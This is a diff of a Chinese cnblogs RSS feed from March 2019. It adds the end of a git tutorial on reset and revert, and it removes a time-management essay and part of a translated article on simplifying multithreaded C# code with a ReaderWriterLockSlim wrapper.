+&lt;p&gt;所以，&lt;code&gt;git reset --mixed HEAD&lt;/code&gt; (可以简写为 &lt;code&gt;git reset&lt;/code&gt;)，实现的效果就是：将暂存区中的内容，回退到工作区。&lt;br/&gt;&lt;code&gt;git reset --hard HEAD&lt;/code&gt; (可以简写为 &lt;code&gt;git reset --hard&lt;/code&gt;)，实现的效果就是：将工作区和暂存区中的全部内容。&lt;/p&gt;
+&lt;p&gt;案例1 将图中的 2 3 4合并为一个提交&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083344643-1824050497.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;案例2 移除误合并&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083351165-1102786425.png&quot;/&gt;&lt;/p&gt;
+&lt;h3 id=&quot;revert&quot;&gt;3.4 revert&lt;/h3&gt;
+&lt;p&gt;reset 用于修改错误，通常会修改提交历史，&lt;br/&gt;这在团队协作分支上是危险且不允许的（如很多仓库的 master 分支）。&lt;br/&gt;这时可以使用 revert 命令。&lt;/p&gt;
+&lt;p&gt;revert 很好理解，就是新建一个提交，用于撤销之前的修改。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083403271-617385899.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;有个问题，revert 一个 merge 提交会怎么样？&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083408272-580063825.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;如图，如果执行 &lt;code&gt;(@f/table)git revert 6&lt;/code&gt;&lt;br/&gt;会得到类似这样的提示：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083420420-2084972935.png&quot;/&gt;&lt;/p&gt;
+&lt;p&gt;这时，使用 -m 参数可以指定保留那边的提交，可选内容只有 1 和 2 （对于通常的两两合并的情况而言），&lt;br/&gt;1 指代当前分支的那些提交，如果不是很确定，可以使用 git show 命令查看那个合并提交，在前的那个父节点为 1 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/662394/201903/662394-20190323083427946-1525346215.png&quot;/&gt;&lt;/p&gt;
+&lt;hr/&gt;&lt;p&gt;留两个思考题：&lt;br/&gt;1 如何在一切皆 commit 的语境下理解 git commit --amend&lt;br/&gt;2 如何在一切皆 commit 的语境下理解 git stash&lt;/p&gt;
+</description>
+<pubDate>Sat, 23 Mar 2019 00:36:00 +0000</pubDate>
+<dc:creator>J.晒太阳的猫</dc:creator>
+<og:description>在对 git 有了基本理解和知道常规操作之后，如何对 git 的使用有进一步的理解？ 一切皆 commit 或许是个不错的理解思路。 本文将从『一切皆 commit 』的角度，通过 g</og:description>
+<dc:language>zh-cn</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>http://www.cnblogs.com/jasongrass/p/10582449.html</dc:identifier>
+</item>
+<item>
 <title>计算机启动过程 - AdamWong</title>
 <link>http://www.cnblogs.com/adamwong/p/10582183.html</link>
 <guid isPermaLink="true" >http://www.cnblogs.com/adamwong/p/10582183.html</guid>
@@ -355,1237 +1566,6 @@ Immediately after this method &lt;/span&gt;&lt;span&gt;is&lt;/span&gt; called, c
 <dc:language>zh-cn</dc:language>
 <dc:format>text/html</dc:format>
 <dc:identifier>http://www.cnblogs.com/zhaof/p/10581972.html</dc:identifier>
-</item>
-<item>
-<title>时间管理是个&quot;伪命题&quot;吗？ - 美码师</title>
-<link>http://www.cnblogs.com/littleatp/p/10581746.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/littleatp/p/10581746.html</guid>
-<description>&lt;p&gt;长期以来，时间管理一直被认为是&lt;strong&gt;自我管理，团队管理，项目管理&lt;/strong&gt;的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。&lt;br/&gt;但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理的一些感想。&lt;/p&gt;
-&lt;h2 id=&quot;时间是难以管理的&quot;&gt;时间是难以管理的&lt;/h2&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223604112-1997722361.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;以一个简单点例子来说明：&lt;br/&gt;我今天定了一个目标，打算&lt;strong&gt;花半天时间学习一下 vue.js，做一个基础的 mvc 案例&lt;/strong&gt;出来。&lt;br/&gt;那么假设我有4个小时进行学习，于是我会列出下面的一个计划详单：&lt;/p&gt;
-&lt;ul&gt;&lt;li&gt;第一个小时，&lt;strong&gt;阅读官方文档&lt;/strong&gt;，有一个大致理念上的了解；&lt;/li&gt;
-&lt;li&gt;第二个小时，&lt;strong&gt;阅读别人的博客案例&lt;/strong&gt;，了解真实用法是怎么做的；&lt;/li&gt;
-&lt;li&gt;第三个小时，&lt;strong&gt;设计我的案例&lt;/strong&gt;，完成简单的界面框架，js方法定义；&lt;/li&gt;
-&lt;li&gt;第四个小时，&lt;strong&gt;整合 vue.js&lt;/strong&gt;，实现逻辑代码并完成调试。&lt;/li&gt;
-&lt;/ul&gt;&lt;p&gt;好了，看似近乎完美的一个计划。真实执行起来会是怎么样呢？&lt;/p&gt;
-&lt;h3 id=&quot;第一个小时&quot;&gt;第一个小时&lt;/h3&gt;
-&lt;p&gt;阅读官方文档，由于有中文材料，很快就读完了，顺便还看了下vue的一些周边框架，如 vux 、mui。&lt;/p&gt;
-&lt;h3 id=&quot;第二个小时&quot;&gt;第二个小时&lt;/h3&gt;
-&lt;p&gt;阅读别人的博客案例，我找了五篇博客，每一篇都不大一样，关键是其中的一些API用法不尽相同，于是产生了疑惑，开始寻求答案。&lt;br/&gt;于是不停翻看 vue 的 api 说明，对比不同版本内 api 的用法。&lt;br/&gt;然后严重的事情发生了，我开始纠结于使用哪个版本进行学习，是使用最稳定的呢？还是用最新的开发版。&lt;br/&gt;那些流行的 UI 框架又是基于哪个版本开发的，我又开始一通乱找，看看那些 vue版本的比较，看看那些vue生态那些优秀的UI框架支持什么版本。&lt;br/&gt;三个小时过去了，我还是没能做出抉择，眼看时间一点点过去，索性不管了，就用最新的吧...&lt;/p&gt;
-&lt;h3 id=&quot;第三个小时&quot;&gt;第三个小时&lt;/h3&gt;
-&lt;p&gt;不，应该是&lt;strong&gt;第五个小时&lt;/strong&gt;了，我肚子饿了，于是拿起手机叫个外卖，美团上的优惠券好多阿，不管了，先领了再说。&lt;br/&gt;什么？优惠券要指定商家才能使用？于是又检索几家店家...这次，花掉了一个十亿级大表全表扫描的时间，大概是半小时吧。然后，为了保证后面的精神头，花了半小时午睡。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223644087-1540471819.png&quot;/&gt;&lt;/p&gt;
-&lt;h3 id=&quot;第六个小时&quot;&gt;第六个小时&lt;/h3&gt;
-&lt;p&gt;我已经确定要用什么版本了。可是问题来了，我应该用什么IDE进行开发呢？WebStorm好像不错，但是听老王说很重量级。IDEA也可以用，但是毕竟是JAVA的工具...&lt;br/&gt;好了，强迫症再次上头，花十分钟安装WebStom并体验了下觉得不舒服，又转而使用IDEA的插件，这时候，四十分钟过去了。&lt;br/&gt;接下来，凭借自己&lt;strong&gt;&quot;强大的抽象思维&quot;&lt;/strong&gt;快速定义好了接口和基础界面，只花了二十分钟！&lt;/p&gt;
-&lt;h3 id=&quot;第七个小时&quot;&gt;第七个小时&lt;/h3&gt;
-&lt;p&gt;整合 vue.js ，把 vue.js 下载并整合到代码里，接下来完成逻辑代码编写，只花了二十分钟。之后开始调试，但在我的浏览器怎么样也没法调通，于是怀疑是浏览器版本问题，换了chrome/firefox 都还是不行之后，又怀疑是代码写得不对，重新编写代码..一通乱麻之后，才找到真正原因：引入其他框架冲突了..，通过网上介绍的办法解决了问题。&lt;br/&gt;一看手机，一个半小时过去了，距离一开始的计划，我花了两倍的时间！ 而且，我竟然还把外卖的事情给忘了..&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223657848-1173452907.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;看，这就是一个跟时间管理有关的例子，不知道你会不会有似曾相识的感觉呢？&lt;br/&gt;所以我想说时间很难管理，本质上或许更多的来源于目标的不清晰、又或是意志力不够坚定、旧的坏习惯使然等等。&lt;/p&gt;
-&lt;h2 id=&quot;是什么偷走了时间&quot;&gt;是什么偷走了时间&lt;/h2&gt;
-&lt;p&gt;前面的例子，听起来更像是一个强迫症和重度拖延症患者的故事。但是在平时的工作里面，一定会有非常多的事情像洪水一样想要吞噬你的计划。&lt;br/&gt;比如：&lt;/p&gt;
-&lt;h4 id=&quot;a.-各种打断式的会议&quot;&gt;A. 各种打断式的会议&lt;/h4&gt;
-&lt;p&gt;事实上，有很多的会议都不是必须的，或者说有80%的会议里面，其中80%的时间都是不必要的。&lt;br/&gt;这听取起来好像耸人听闻，但仔细回想你参加过的每一个会议，最终剩余的价值是什么？ 会议纪要！没错，只有会议后的纪要能被记住并使用。&lt;br/&gt;那么会议纪要内容有多少，一般都不多，沟通效率非常高的话，10%的会议时间可能就足够了。&lt;br/&gt;打断式的会议，除了会议本身的时长之外，程序员可能还需要花费一定时间在大脑中做切换，而且这个时间比其他职业会高一些的。&lt;/p&gt;
-&lt;h4 id=&quot;b.-缺斤少两的交付&quot;&gt;B. &quot;缺斤少两&quot;的交付&lt;/h4&gt;
-&lt;p&gt;关于这点，偏向于指技术债务、或文档债务，技术债务呢，比如你的代码写得太随意，可靠性不好，心想着反正现在也没啥问题，就先这样吧。&lt;br/&gt;但在未来的某些场景下，问题被暴露出来了还是要你来修复(如果你跑路了可能另当别论)。文档债务也很常见，许多开发的不喜欢写文档，其实是懒，那么到后来，&lt;br/&gt;会不断的有人来问你，A是怎么回事，B又是怎么来的.. 烦不胜烦。这些都在你的计划内吗？&lt;br/&gt;一句话，出来混的，始终还是要还的！&lt;/p&gt;
-&lt;h4 id=&quot;c.-邮件的魔力&quot;&gt;C. 邮件的魔力&lt;/h4&gt;
-&lt;p&gt;当大家都喜欢上发邮件时，你看邮件，总会想要一下子把收件箱的未读邮件全部看完、每一封需要回复的都要回复完。&lt;br/&gt;甚至在干活的时候，是不是也会点开Outlook客户端去检查一下，生怕有漏..&lt;br/&gt;一次次的切换，会导致你不专心、走神，精神及代码质量低下.. 或者，让自己上下班临界时间处理邮件，是个办法。&lt;/p&gt;
-&lt;h4 id=&quot;d.-座位上的叨扰&quot;&gt;D. 座位上的叨扰&lt;/h4&gt;
-&lt;p&gt;总有些人，会特别喜欢面对面沟通，觉得这样效率是最高的。没错，&quot;你“的效率的确是提高了，但别人呢？&lt;br/&gt;这类现象发生在很多项目经理、产品经理身上，他们脱离技术工作已久，或许已经不会从别人的角度去思考问题了。&lt;br/&gt;那么对于他们来说，日常的工作就是面对面沟通，认为这已经不足为奇了。但对于程序员来说，长期以往可能是个噩梦！&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322223714553-1800892920.png&quot;/&gt;&lt;/p&gt;
-&lt;p&gt;上面的这些，都是我平时工作经历过的东西，而且相信，大多数人也正在经受这样的事情。&lt;br/&gt;可能小团队不会有，大中型企业会有，不善管理的部门很严重...&lt;/p&gt;
-&lt;h2 id=&quot;有什么良药&quot;&gt;有什么良药&lt;/h2&gt;
-&lt;p&gt;时间管理既然这么难，又有这么多的事情烦扰，那还做什么管理？&lt;br/&gt;我认为，尽管现阶段可能不会有什么包好的方法，但时间管理还是要做，不做，那跟咸鱼有什么分别呢？&lt;br/&gt;《高效能认识的七个习惯》、《番茄工作法图解》都是一些畅销书，为啥畅销，就是因为太多人都希望做好时间管理了。&lt;br/&gt;但光凭看书不行，还得实战、不停的修炼不是？ 那我炼了这么久，有啥心得体会呢？&lt;/p&gt;
-&lt;h4 id=&quot;尝试给自己更多的时间尤其是学习类的目标给够预留的部分&quot;&gt;1. 尝试给自己更多的时间，尤其是学习类的目标给够预留的部分。&lt;/h4&gt;
-&lt;h4 id=&quot;把目标写下来做分解一条条读一遍看看哪些重要哪些不重要最终只要重要的完成就好了&quot;&gt;2. 把目标写下来做分解，一条条读一遍看看哪些重要哪些不重要，最终只要重要的完成就好了。&lt;/h4&gt;
-&lt;h4 id=&quot;认识时间不好管理的现实做好失败的准备尽量消除焦虑&quot;&gt;3. 认识时间不好管理的现实，做好失败的准备，尽量消除焦虑。&lt;/h4&gt;
-&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
-&lt;p&gt;你是一个重度拖延症患者，还是一个自我管理强人？对于时间管理，你怎么看呢，欢迎留言讨论&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/242916/201903/242916-20190322224256548-761655939.png&quot;/&gt;&lt;/p&gt;
-</description>
-<pubDate>Fri, 22 Mar 2019 14:40:00 +0000</pubDate>
-<dc:creator>美码师</dc:creator>
-<og:description>长期以来，时间管理一直被认为是 自我管理，团队管理，项目管理 的既关键又基础的手段，就连笔者本人也一直在崇尚时间管理的理念。 但是这里要讲的，不是什么鬼神方法论。而主要是对长时间以来学习和实践时间管理</og:description>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/littleatp/p/10581746.html</dc:identifier>
-</item>
-<item>
-<title>【译】最大限度地降低多线程 C# 代码的复杂性 - 楚人Leo</title>
-<link>http://www.cnblogs.com/leolion/p/10581723.html</link>
-<guid isPermaLink="true" >http://www.cnblogs.com/leolion/p/10581723.html</guid>
-<description>&lt;p&gt;分支或多线程编程是编程时最难最对的事情之一。这是由于它们的并行性质所致，即要求采用与使用单线程的线性编程完全不同的思维模式。对于这个问题，恰当类比就是抛接杂耍表演者，必须在空中抛接多个球，而不要让它们相互干扰。这是一项重大挑战。然而，通过正确的工具和思维模式，这项挑战是能应对的。&lt;/p&gt;
-&lt;p&gt;本文将深入介绍我为了简化多线程编程和避免争用条件、死锁等其他问题而编写的一些工具。可以说，工具链以语法糖和神奇委托为依据。不过，引用伟大的爵士音乐家 Miles Davis 的话：“在音乐中，没有声音比有声音更重要。” 声音间断就产生了奇迹。&lt;/p&gt;
-&lt;p&gt;从另一个角度来说，不一定是关乎可以编码什么，而是关乎可以选择不编码什么，因为你希望通过间断代码行产生一点奇迹。引用 Bill Gates 的一句话：“根据代码行数来衡量工作质量就像通过重量来衡量飞机质量一样。” 因此，我希望能帮助开发人员减少编码量，而不是教导开发人员如何编写更多代码。&lt;/p&gt;
-&lt;h2&gt;同步挑战&lt;/h2&gt;
-&lt;p&gt;在多线程编程方面遇到的第一个问题是，同步对共享资源的访问权限。当两个或多个线程共享对某个对象的访问权限且可能同时尝试修改此对象时，就会出现这个问题。当 C# 首次发布时，lock 语句实现了一种基本方法，可确保只有一个线程能访问指定资源（如数据文件），且效果很好。C# 中的 lock 关键字很容易理解，它独自颠覆了我们对这个问题的思考方式。&lt;/p&gt;
-&lt;p&gt;不过，简单的 lock 存在一个主要缺陷：它不区分只读访问权限和写入访问权限。例如，可能要从共享对象中读取 10 个不同的线程，并且通过 System.Threading 命名空间中的 ReaderWriterLockSlim 类授权这些线程同时访问实例，而不导致问题发生。与 lock 语句不同，此类可便于指定代码是将内容写入对象，还是只从对象读取内容。这样一来，多个读取器可以同时进入，但在其他所有读写线程均已完成自己的工作前，拒绝任何写入代码访问。&lt;/p&gt;
-&lt;p&gt;现在的问题是：如果使用 ReaderWriterLock 类，语法就会变得很麻烦，大量的重复代码既降低了可读性，又随时间变化增加了维护复杂性，并且代码中通常会分散有多个 try 和 finally 块。即使是简单的拼写错误，也可能会带来日后有时极难发现的灾难性影响。 &lt;/p&gt;
-&lt;p&gt;通过将 ReaderWriterLockSlim 封装到简单的类中，这个问题瞬间解决，不仅重复代码不再会出现，而且还降低了小拼写错误毁一天劳动成果的风险。图 1 中的类完全基于 lambda 技巧。可以说，这就是对一些委托应用的语法糖（假设存在几个接口）。最重要的是，它在很大程度上有助于实现避免重复代码原则 (DRY)。&lt;/p&gt;
-&lt;p&gt;图 1：封装 ReaderWriterLockSlim&lt;/p&gt;
-&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; Synchronizer&amp;lt;TImpl, TIRead, TIWrite&amp;gt; &lt;span&gt;where&lt;/span&gt;&lt;span&gt; TImpl : TIWrite, TIRead {
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     ReaderWriterLockSlim _lock = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; ReaderWriterLockSlim ();
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;    TImpl _shared;
-&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
-&lt;span&gt; 5&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Synchronizer (TImpl shared) {
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;         _shared =&lt;span&gt; shared;
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
-&lt;span&gt; 9&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Read (Action&amp;lt;TIRead&amp;gt;&lt;span&gt; functor) {
-&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        _lock.EnterReadLock ();
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;            functor (_shared);
-&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;            _lock.ExitReadLock ();
-&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;        }
-&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; 
-&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Write (Action&amp;lt;TIWrite&amp;gt;&lt;span&gt; functor) {
-&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;        _lock.EnterWriteLock ();
-&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;21&lt;/span&gt; &lt;span&gt;            functor (_shared);
-&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;         } &lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;23&lt;/span&gt; &lt;span&gt;            _lock.ExitWriteLock ();
-&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;        }
-&lt;/span&gt;&lt;span&gt;25&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;/div&gt;
-&lt;p&gt;图 1 中只有 27 行代码，但却精妙简洁地确保对象跨多个线程进行同步。此类假定类型中有读取接口和写入接口。如果由于某种原因而无法更改需要将访问权限同步到的基础类实现，也可以重复模板类本身三次，通过这种方式使用它。基本用法如图 2 所示。&lt;/p&gt;
-&lt;p&gt;图 2：使用 Synchronizer 类&lt;/p&gt;
-&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IReadFromShared {
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue ();
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;}
-&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; 
-&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; IWriteToShared {
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value);
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;}
-&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; 
-&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MySharedClass : IReadFromShared, IWriteToShared {
-&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt;&lt;span&gt; _foo;
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt; 
-&lt;span&gt;12&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt;&lt;span&gt; GetValue () {
-&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;return&lt;/span&gt;&lt;span&gt; _foo;
-&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; 
-&lt;span&gt;16&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; SetValue (&lt;span&gt;string&lt;/span&gt;&lt;span&gt; value) {
-&lt;/span&gt;&lt;span&gt;17&lt;/span&gt;         _foo =&lt;span&gt; value;
-&lt;/span&gt;&lt;span&gt;18&lt;/span&gt; &lt;span&gt;    }
-&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;}
-&lt;/span&gt;&lt;span&gt;20&lt;/span&gt; 
-&lt;span&gt;21&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; Foo (Synchronizer&amp;lt;MySharedClass, IReadFromShared, IWriteToShared&amp;gt;&lt;span&gt; sync) {
-&lt;/span&gt;&lt;span&gt;22&lt;/span&gt;     sync.Write (x =&amp;gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;         x.SetValue (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;new value&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;    });
-&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     sync.Read (x =&amp;gt;&lt;span&gt; {
-&lt;/span&gt;&lt;span&gt;26&lt;/span&gt; &lt;span&gt;        Console.WriteLine (x.GetValue ());
-&lt;/span&gt;&lt;span&gt;27&lt;/span&gt; &lt;span&gt;    })
-&lt;/span&gt;&lt;span&gt;28&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;/div&gt;
-&lt;div class=&quot;codeCaption&quot; readability=&quot;10&quot;&gt;
-&lt;p&gt;在图 2 的代码中，无论有多少线程在执行 Foo 方法，只要执行另一个 Read 或 Write 方法，就不会调用 Write 方法。不过，可以同时调用多个 Read 方法，而不必在代码中分散多个 try/catch/finally 语句，也不必不断重复相同的代码。我在此郑重声明，通过简单字符串来使用它是没有意义的，因为 System.String 不可变。我使用简单的字符串对象来简化示例。&lt;/p&gt;
-&lt;/div&gt;
-&lt;p&gt;基本思路是，必须将所有可以修改实例状态的方法都添加到 IWriteToShared 接口中。同时，应将所有只从实例读取内容的方法都添加到 IReadFromShared 接口中。通过将诸如此类的问题分散到两个不同的接口，并对基础类型实现这两个接口，可使用 Synchronizer 类来同步对实例的访问权限。这样一来，将访问权限同步到代码的做法变得更简单，并且基本上可以通过更具声明性的方式这样做。&lt;/p&gt;
-&lt;p&gt;在多线程编程方面，语法糖可能会决定成败。调试多线程代码通常极为困难，并且创建同步对象的单元测试可能会是徒劳无功之举。&lt;/p&gt;
-&lt;p&gt;如果需要，可以创建只包含一个泛型参数的重载类型，不仅继承自原始 Synchronizer 类，还将它的一个泛型参数作为类型参数三次传递到它的基类。这样一来，就不需要读取接口或写入接口了，因为可以直接使用类型的具体实现。不过，这种方法要求手动处理需要使用 Write 或 Read 方法的部分。此外，虽然它的安全性稍差一点，但确实可便于将无法更改的类包装到 Synchronizer 实例中。&lt;/p&gt;
-&lt;h2&gt;用于分支的 lambda 集合&lt;/h2&gt;
-&lt;p&gt;迈出第一步来使用神奇的 lambda（或在 C# 中称为“委托”）后，不难想象，可以利用它们完成更多操作。例如，反复出现的常见多线程主题是，让多个线程与其他服务器联系，以提取数据并将数据返回给调用方。&lt;/p&gt;
-&lt;p&gt;最简单的例子就是，应用程序从 20 个网页读取数据，并在完成后将 HTML 返回给一个根据所有网页的内容创建某种聚合结果的线程。除非为每个检索方法都创建一个线程，否则此代码的运行速度比预期慢得多：99% 的所有执行时间可能会花在等待 HTTP 请求返回上。&lt;/p&gt;
-&lt;p&gt;在一个线程上运行此代码的效率很低，并且线程创建语法非常容易出错。随着你支持多个线程及其助理对象，挑战变得更严峻，开发人员不得不在编写代码时使用重复代码。意识到可以创建委托集合和用于包装这些委托的类后，便能使用一个方法调用来创建所有线程。这样一来，创建线程就轻松多了。&lt;/p&gt;
-&lt;p&gt;图 3 中的一段代码创建两个并行运行的此类 lambda。请注意，此代码实际上来自我的第一版 Lizzie 脚本语言的单元测试 (&lt;a href=&quot;http://bit.ly/2FfH5y8&quot;&gt;bit.ly/2FfH5y8&lt;/a&gt;)。&lt;/p&gt;
-&lt;p&gt;图 3：创建 lambda&lt;/p&gt;
-&lt;div class=&quot;codeCaption&quot; readability=&quot;9&quot;&gt;
-&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
-&lt;pre&gt;
-&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; ExecuteParallel_1 () {
-&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; sync = &lt;span&gt;new&lt;/span&gt; Synchronizer&amp;lt;&lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;, &lt;span&gt;string&lt;/span&gt;&amp;gt; (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt; 
-&lt;span&gt; 4&lt;/span&gt;     &lt;span&gt;var&lt;/span&gt; actions = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Actions ();
-&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;foo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
-&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;     actions.Add (() =&amp;gt; sync.Assign ((res) =&amp;gt; res + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;bar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;));
-&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; 
-&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    actions.ExecuteParallel ();
-&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
-&lt;span&gt;10&lt;/span&gt;     &lt;span&gt;string&lt;/span&gt; result = &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
-&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     sync.Read (&lt;span&gt;delegate&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt; val) { result =&lt;span&gt; val; });
-&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;     Assert.AreEqual (&lt;span&gt;true&lt;/span&gt;, &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_foobar&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; == result || result == &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;initial_barfoo&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;);
-&lt;/span&gt;&lt;span&gt;13&lt;/span&gt; }
-&lt;/pre&gt;&lt;/div&gt;
-&lt;/div&gt;
-&lt;p&gt;仔细看看这段代码便会发现，计算结果并未假定我的两个 lambda 的执行存先后顺序。执行顺序并未明确指定，并且这些 lambda 是在不同的线程上执行。这是因为，使用图 3 中的 Actions 类，可以向它添加委托，这样稍后就能决定是要并行执行委托，还是按顺序执行委托。&lt;/p&gt;
-&lt;p&gt;为此，必须使用首选机制创建并执行许多 lambda。在图 3 中可以看到前面提到的 Synchronizer 类，用于同步对共享字符串资源的访问权限。不过，它对 Synchronizer 使用了新方法 Assign，我并未在图 1中的列表内为 Synchronizer 类添加此方法。Assign 方法使用前面 Write 和 Read 方法中使用的相同“lambda 技巧”。&lt;/p&gt;
